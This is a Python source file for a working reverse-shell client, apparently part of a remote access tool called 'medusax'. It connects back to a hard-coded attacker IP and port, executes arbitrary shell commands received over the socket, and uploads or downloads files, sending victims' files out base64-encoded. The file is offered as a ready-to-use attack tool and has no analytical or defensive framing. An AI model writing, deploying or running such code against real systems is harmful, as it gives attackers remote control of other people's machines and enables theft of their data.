import socket
import subprocess
import os
import json
import base64

# Set up the target server and port (attacker's machine)
HOST = "10.0.1.37"  # Replace with the attacker's IP address
PORT = 4444  # Replace with the port the attacker is listening on

# Function to execute commands on the target machine
def execute_command(command):
    # Execute the command and return the result
    return subprocess.run(command, shell=True, capture_output=True)

def send_json(sock, data):
    json_data = json.dumps(data)  # Convert TCP streams to JSON data for reliable transfer
    sock.send(json_data.encode())  # Encode to bytes before sending

def recieve_json(sock):
    json_data = ""
    while True:
        try:
            json_data = json_data + sock.recv(1024).decode()  # Decode bytes to string
            return json.loads(json_data)  # Return the full file till the end of the string/data
        except ValueError:
            continue

def read_file(path):
    with open(path, "rb") as file:  # Read binary file
        return base64.b64encode(file.read()).decode()  # Decode bytes to string

def write_file(path, content):
    with open(path, "wb") as file:  # Write binary file
        file.write(base64.b64decode(content))
        return "[+] Upload successful [+]"

# Create a socket object to connect back to the attacker
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Attempt to connect to the attacker's server
try:
    sock.connect((HOST, PORT))

    # Send an initial message to show the connection is established
    sock.sendall("Successfully connected to the client.\n".encode("utf-8"))

    default_prompt = "admin@medusax~$ "
    current_prompt = default_prompt
    in_shell_mode = False  # Tracks whether the client is in shell mode

    while True:
        # Send the current prompt to the server
        sock.sendall(current_prompt.encode("utf-8"))

        # Receive the command from the server
        command = recieve_json(sock)

        # Handle the 'km' command to completely disconnect
        if command[0].lower() == "km":
            sock.sendall("Disconnecting...\n".encode("utf-8"))
            sock.close()
            break

        # Handle the 'shell' command to enter the shell mode
        if command[0].lower() == "shell":
            # Switch to the C:\ directory
            try:
                os.chdir("C:\\")
                in_shell_mode = True  # Enable shell mode
                current_prompt = f"{os.getcwd()} > "
                sock.sendall("Entering remote shell mode. Type 'exit' to leave.\n".encode("utf-8"))
            except Exception as e:
                sock.sendall(f"Failed to switch to C:\\: {e}\n".encode("utf-8"))
            continue

        # Handle the 'shell -d <directory>' command to set a specific directory
        if command[0] == "shell" and len(command) > 1 and command[1] == "-d":
            try:
                directory = command[2].strip()
                os.chdir(directory)  # Change to the specified directory
                in_shell_mode = True  # Enable shell mode
                current_prompt = f"{os.getcwd()} > "
                sock.sendall(f"Changed directory to {directory}\n".encode("utf-8"))
            except Exception as e:
                sock.sendall(f"Failed to change directory: {e}\n".encode("utf-8"))
            continue

        # Handle file upload/download commands
        elif command[0] == "download":
            result = read_file(command[1])
        elif command[0] == "upload":
            result = write_file(command[1], command[2])
        else:
            # Execute received shell command
            output = execute_command(" ".join(command))
            result = output.stdout + output.stderr

        # Send back the result
        send_json(sock, result)

except Exception as e:
    print(f"Error: {e}")
    sock.close()
